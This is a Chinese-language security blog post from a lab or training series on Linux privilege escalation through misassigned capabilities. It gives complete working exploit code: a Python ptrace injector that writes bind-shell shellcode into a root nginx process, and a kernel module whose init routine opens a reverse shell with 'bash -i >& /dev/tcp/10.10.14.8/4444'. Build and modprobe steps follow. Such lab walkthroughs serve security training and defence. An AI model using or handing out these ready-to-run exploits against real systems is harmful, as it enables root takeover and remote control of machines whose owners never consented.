#  Linux提权系列23: [训练营]利用linux能力漏洞6   
原创 debugeeker  奶牛安全   2023-04-17 08:02  
  
这篇讲述涉及进程注入和内核模块注入的能力  
## CAP_SYS_PTRACE  
  
在本实验中，python 解释器在有效集和允许集都具有 cap_sys_ptrace 功能  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicby06SPO4VySI77NRYXYXlHvzju8NnVY59GX4fPglHu5ib2qHIh92HTTicdJRHdhKZpb4JrwOzbShxXg/640?wx_fmt=png "")  
  
当运行进程的有效集有 cap_sys_ptrace 能力，它可以打开任何进程并将数据写入其内存。这意味着可以注入含有打开shell的恶意代码到正在运行的进程，然后再连接到它。这样将获得带有进程ruid 的 shell。有了这个能力，如果一个进程正在以 root 用户运行，可以直接升级到 root 用户并获得特权 shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicby06SPO4VySI77NRYXYXlHvc9oke65d4WlyhN7UwcHOaWsLoDsiaPxYpA48mJbdt1ZPBWSia4gElQfA/640?wx_fmt=png "")  
  
发现nginx父进程是以root用户运行的  
  
编写脚本exploit.py  
```
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)

```  
  
此代码将在 nginx 进程中注入一个 shellcode，并在 5600 上打开一个绑定 shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicby06SPO4VySI77NRYXYXlHvhWz1owPFvoJ7uCnsWEvg6JhricwVnCbKnOYNAiaib7bAG5OVOVcK3nmmQ/640?wx_fmt=png "")  
  
注入 shellcode 后，可以看到端口 5600 已打开，如前所述。现在可以使用 netcat 连接到端口并以 root 用户身份执行命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicby06SPO4VySI77NRYXYXlHvNicEzlVhBoXDx0oU0alwNxQa5egsAaHNhia1za9OiapZnytrp653IHzibQ/640?wx_fmt=png "")  
## CAP_SYS_MODULE  
  
在这个实验中，kmod 二进制文件在有效集和允许集都具有 cap_sys_module 功能  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicby06SPO4VySI77NRYXYXlHvHpIPATYiaibWnQwvia8clIMAX1ticSLocAlJldicLX7dPwsMm0asGyE3JIQ/640?wx_fmt=png "")  
  
Linux 内核允许通过允许用户添加或删除内核模块来扩展其功能。这些是可插入的代码片段，每个代码片段执行一些特定的操作。例如，当添加虚拟机additions时，它会注入内核模块以允许与主机操作系统进行无缝交互。所以很明显，拥有这样的权限，应该是root用户。但是如果一个进程以 cap_sys_module 能力运行，它可以执行这样的操作。而且，如果像 python 或 kmod 这样的进程具有此能力，可以使用反向 shell 直接升级到 root 用户。  
  
reverse-shell.c:  
```
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);

```  
  
Makefile:  
```
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

```  
  
是时候构建内核模块了。要执行此操作，请运行 make 命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicby06SPO4VySI77NRYXYXlHvTEUibUaicJXnXUKpSKCa497q3h4IW1nuJiawcnQw82VvLpwREHbxpmk4w/640?wx_fmt=png "")  
  
构建成功后，发现有一个名为reverse-shell.ko的文件。这是可以注入的内核对象。由于这是一次性反向 shell，因此启动了 ncat 侦听器。  
  
使用insmod注入内核模块，其中insmod会调用kmod做实际注入工作。由于kmod有cap_sys_module能力，所以，它会成功。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicby06SPO4VySI77NRYXYXlHvs8wicMTAjEIBx4FSHlleUek6icOUUSNb6IDCQj2XnjfsOu0hhnYg6d3w/640?wx_fmt=png "")  
  
一旦注入完成，ncat会收到新连接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicby06SPO4VySI77NRYXYXlHvZjSeufbtdx7Mb4V1NCFh9gksqJLwAfrUcnicM62dzjbHrNWvrb7qRWA/640?wx_fmt=png "")  
  
现在需要做的就是在系统中找到flag文件并读取它  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicby06SPO4VySI77NRYXYXlHv410aySII9ZekODHVe8ibg6U1rUBFSNISjp1UjeQtFNYxpiczYDw44r8Q/640?wx_fmt=png "")  
## CAP_SYS_MODULE 2  
  
在本实验中，python 解释器在有效集和允许集有 cap_sys_module，并且 kmod 模块安装在 python 中  
  
如果 python 解释器有cap_sys_module能力并且安装了 kmod, 可以使用 modprobe 实用程序注入内核模块。  
  
Modprobe 需要一些预处理, 需要先创建一个modules目录，将系统中的模块复制到该目录下  
```
$ mkdir lib/modules -p
$ cp -a /lib/modules/$(uname -r)/ lib/modules/$(uname -r)

```  
  
使用上一节的代码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicby06SPO4VySI77NRYXYXlHvIaPMmyUuw54LibgqSvicHGj0iaXpbZIGAibjDc6TV31a5rBefoxzYuL2jQ/640?wx_fmt=png "")  
  
用netcat监听  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicby06SPO4VySI77NRYXYXlHvn5ja2yyRoyuDhgtR71BJ22zenfPibktWaGb1Qhice6UlgMnsP6heULXg/640?wx_fmt=png "")  
  
使用 depmod 工具更新内核模块列表，最终 modprobe 在查找和插入模块时将读取该列表  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicby06SPO4VySI77NRYXYXlHvkANr7hSXCXNic8wz3FzjhsVnJFyYnSRlzfSNAibGJkeMOhZgWEMVtujw/640?wx_fmt=png "")  
  
一旦注入完成，ncat会收到新连接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicby06SPO4VySI77NRYXYXlHvDyvib3wKpicbF18v9Pc5CJGVriaDD6UVva60GpvicDcXQMK47yotPI2XTA/640?wx_fmt=png "")  
# 请点一下右下角的“在看”，谢谢！！  
# 暗号：980662  
  
  
  
